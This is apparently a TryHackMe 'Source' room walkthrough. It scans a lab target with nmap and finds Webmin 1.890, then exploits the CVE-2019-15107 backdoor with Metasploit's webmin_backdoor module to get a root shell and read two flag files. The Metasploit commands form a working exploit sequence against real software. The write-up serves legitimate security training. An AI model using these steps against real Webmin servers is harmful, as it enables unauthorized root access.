# Source — TryHackMe Walkthrough

**Room:** Source | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | 10.48.131.168 |
| Attack Machine | Kali Linux |
| Attack IP | 192.168.192.149 |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | Webmin RCE — /home/dark/user.txt |
| 02 | Webmin RCE (root) — /root/root.txt |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.48.131.168 -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH (OpenSSH 7.6p1) |
| 10000/tcp | HTTP (MiniServ 1.890 — Webmin httpd) |

Webmin 1.890 is vulnerable to **CVE-2019-15107** — a backdoor inserted via supply chain attack on SourceForge.

---

## Phase 2: Exploitation — CVE-2019-15107

### Launch Metasploit
```bash
msfconsole
msf6 > use exploit/linux/http/webmin_backdoor
msf6 > set RHOSTS 10.48.131.168
msf6 > set RPORT 10000
msf6 > set SSL true
msf6 > set LHOST 192.168.192.149
msf6 > run
```

**Root shell obtained directly** — Webmin runs as root.

---

## Phase 3: Flag Capture

```bash
cat /root/root.txt
```
**Flag 02 captured.**

```bash
cat /home/dark/user.txt
```
**Flag 01 captured.**

Note the compromised `webmin_1.890_all.deb` package in dark's home directory.

---

## Vulnerability Chain

1. **CVE-2019-15107** — Unauthenticated command injection via password_change.cgi
2. **No privesc needed** — Webmin runs as root

## Key Takeaways

- Webmin 1.890 was compromised via a real supply chain attack on SourceForge
- Not all services require a privilege escalation step — check what user the service runs as
- Always verify software versions against known CVE databases
